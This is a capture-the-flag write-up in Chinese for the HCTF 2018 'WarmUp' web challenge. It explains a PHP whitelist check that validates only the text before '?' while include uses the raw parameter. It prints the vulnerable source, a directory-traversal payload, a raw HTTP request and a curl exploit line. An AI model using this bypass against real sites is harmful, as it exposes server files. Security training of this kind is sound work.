---
title: HCTF 2018 - Web - WarmUp
date: 2026-11-14 18:16:00
categories:
  - CTF
  - HCTF 2018
  - Web
tags:
  - 文件包含
  - 白名单绕过
  - 目录穿越
  - mb_substr
cover: /img/cover/girl-window-white-flowers.jpg
description: HCTF 2018 的 PHP 文件包含白名单绕过题。checkFile 只校验问号前是否在白名单，include 却用原始参数。构造 file=hint.php?/../../../../ffffllllaaaagggg 穿越读 flag
keywords:
  - LFI
  - 白名单绕过
  - 目录穿越
  - source.php
  - HCTF2018
ai: >-
  本题来自 HCTF 2018，是经典的 PHP 文件包含白名单绕过题。首页注释提示 source.php，emmm::checkFile 对 source.php 与 hint.php 做三次校验，但只检查问号前部分，通过后却用原始 $_REQUEST['file'] 直接 include。hint.php 提示 flag 在 ffffllllaaaagggg。构造 file=hint.php?/../../../../ffffllllaaaagggg：校验截出 hint.php 通过，include 执行完整串时问号后的目录穿越读到 flag，脱敏记为 flag{xxxx}。
copyright_author: Hunter
---

## 题目信息

| 项 | 内容 |
|---|---|
| 比赛 | HCTF 2018 |
| 方向 | Web |
| 难度 | Easy |
| 环境 | 授权靶场（已脱敏） |
| 漏洞类型 | PHP 文件包含（LFI）+ 白名单绕过 |

## 信息收集

访问首页，源码中有注释 `<!--source.php-->`，提示存在源码文件：

```html
<body>
    <!--source.php-->
    <br><img src="https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg" />
</body>
```

访问 `source.php` 得到完整 PHP 源码，访问 `hint.php` 返回 `flag not here, and flag in ffffllllaaaagggg`，得知 flag 文件名。

```http
GET /hint.php HTTP/1.1
Host: target:8080
```

## 漏洞分析

`source.php` 核心逻辑：

```php
class emmm {
    public static function checkFile(&$page) {
        $whitelist = ["source"=>"source.php", "hint"=>"hint.php"];
        // 1. 直接 in_array 检查
        if (in_array($page, $whitelist)) return true;

        // 2. 取 '?' 前部分再检查
        $_page = mb_substr($page, 0, mb_strpos($page.'?', '?'));
        if (in_array($_page, $whitelist)) return true;

        // 3. urldecode 后再取 '?' 前部分检查
        $_page = urldecode($page);
        $_page = mb_substr($_page, 0, mb_strpos($_page.'?', '?'));
        if (in_array($_page, $whitelist)) return true;

        return false;
    }
}
if (!empty($_REQUEST['file']) && is_string($_REQUEST['file']) && emmm::checkFile($_REQUEST['file'])) {
    include $_REQUEST['file'];
    exit;
}
```

关键点：`checkFile` 检查通过后，用**原始** `$_REQUEST['file']` 进行 `include`，而检查时只验证 `?` 前（或 `urldecode` 后 `?` 前）的部分。校验与执行对象不一致，是绕过根源。

## 利用过程

利用 `?` 作为查询字符串分隔符的特性构造 payload：

- `checkFile` 用 `mb_strpos($page.'?', '?')` 截取 `?` 之前的部分（`hint.php`），在白名单内 → 通过检查。
- `include` 时执行完整字符串，`?` 后的 `/../../../../ffffllllaaaagggg` 被当作路径穿越。

最终 payload：

```text
file=hint.php?/../../../../ffffllllaaaagggg
```

完整请求：

```http
GET /index.php?file=hint.php?/../../../../ffffllllaaaagggg HTTP/1.1
Host: target:8080
```

返回 flag（已脱敏）。

## 完整 EXP

```bash
curl "http://target:8080/index.php?file=hint.php?/../../../../ffffllllaaaagggg"
```

## Flag

`flag{xxxx}`（已脱敏，来自 `ffffllllaaaagggg`）

## 踩坑与总结

1. 白名单只校验 `?` 之前的部分，`?` 之后的内容不受检查。
2. `include` 使用原始参数，`?` 后面的 `../../../../` 实现目录穿越。
3. 穿越到 web 根目录上级的 `/ffffllllaaaagggg` 文件读取 flag。
4. 校验函数与执行函数处理的对象不一致（截断前缀 vs 原始字符串），是此类 LFI 的通用审计点。
